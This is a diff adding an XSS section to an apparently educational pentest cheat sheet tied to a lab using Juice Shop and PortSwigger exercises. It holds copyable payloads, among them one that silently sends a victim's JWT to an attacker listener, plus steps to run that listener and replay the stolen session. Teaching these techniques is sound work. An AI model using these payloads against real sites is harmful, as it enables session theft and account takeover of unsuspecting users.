@@ -434,6 +434,105 @@
       </div>
     </section>
 
+    <!-- Category 3b: Cross-Site Scripting -->
+    <section class="cheat-section" id="xss">
+      <div class="cheat-section__header">
+        <span style="font-size:1.25rem;">⚡</span>
+        <h2 class="cheat-section__title">Cross-Site Scripting / XSS (Lab 04)</h2>
+      </div>
+      <div class="cheat-table-container">
+        <table class="cheat-table">
+          <thead>
+            <tr>
+              <th style="width:40%;">Payload / Command</th>
+              <th style="width:25%;">Action</th>
+              <th style="width:25%;">How it works</th>
+              <th style="width:10%;">Source</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>&lt;img src=x onerror=alert(document.domain)&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img src=x onerror=alert(document.domain)>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Prove XSS (DOM, reflected or stored)</strong></td>
+              <td>The image source <span class="flag-pill">x</span> fails to load, so the <span class="flag-pill">onerror</span> handler fires your JS. Works where <code>&lt;script&gt;</code> is stripped but attributes survive</td>
+              <td><a href="./labs/lab04.html#dom-xss-live" class="badge-lab-ref">Lab 04</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>&lt;img src=x onerror="alert(localStorage.getItem('token'))"&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img src=x onerror=&quot;alert(localStorage.getItem(\'token\'))&quot;>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Read the session token</strong></td>
+              <td>Juice Shop keeps the JWT in <span class="flag-pill">localStorage</span>, which JavaScript can read. <span class="flag-pill">HttpOnly</span> protects cookies, not this</td>
+              <td><a href="./labs/lab04.html#steal-session" class="badge-lab-ref">Lab 04</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>&lt;img src=x onerror="new Image().src='http://localhost:9000/?c='+localStorage.getItem('token')"&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img src=x onerror=&quot;new Image().src=\'http://localhost:9000/?c=\'+localStorage.getItem(\'token\')&quot;>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Exfil the token silently</strong></td>
+              <td>A hidden image request ships the token to a server you control. No popup, nothing for the victim to notice. On a real job that host is a box online or Burp Collaborator</td>
+              <td><a href="./labs/lab04.html#steal-session" class="badge-lab-ref">Lab 04</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>python3 -m http.server 9000</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('python3 -m http.server 9000')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Start the exfil listener</strong></td>
+              <td>A one-line web server on your own machine. Watch its log for a <code>GET /?c=eyJ...</code> line with the stolen token glued on</td>
+              <td><a href="./labs/lab04.html#steal-session" class="badge-lab-ref">Lab 04</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>localStorage.setItem('token', '&lt;PASTE_THE_JWT&gt;')</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('localStorage.setItem(\'token\', \'<PASTE_THE_JWT>\')')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Hijack: replay a stolen session</strong></td>
+              <td>Run in an incognito Console, paste the stolen JWT, reload. You're logged in as the victim with no password</td>
+              <td><a href="./labs/lab04.html#steal-session" class="badge-lab-ref">Lab 04</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<script>alert(1)</script>')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Reflected / stored, HTML context</strong></td>
+              <td>The classic solve when your input lands in HTML with nothing encoded. If <code>&lt;script&gt;</code> is filtered, fall back to the <span class="flag-pill">onerror</span> image above</td>
+              <td><a href="./labs/lab04.html#portswigger-ladder" class="badge-lab-ref">Lab 04</a></td>
+            </tr>
+            <tr>
+              <td>
+                <div class="code-copy-inline">
+                  <code>"onmouseover="alert(1)</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('&quot;onmouseover=&quot;alert(1)')">Copy</button>
+                </div>
+              </td>
+              <td><strong>Attribute-context breakout</strong></td>
+              <td>When angle brackets are encoded you can't open a tag. The unencoded double quote closes <code>value="</code> so you bolt an event handler onto the element instead. Exact string depends on the target</td>
+              <td><a href="./labs/lab04.html#portswigger-ladder" class="badge-lab-ref">Lab 04</a></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
     <!-- Category 4: Transport Layer & Handshake State Probing -->
     <section class="cheat-section" id="tcp-handshake">
       <div class="cheat-section__header">
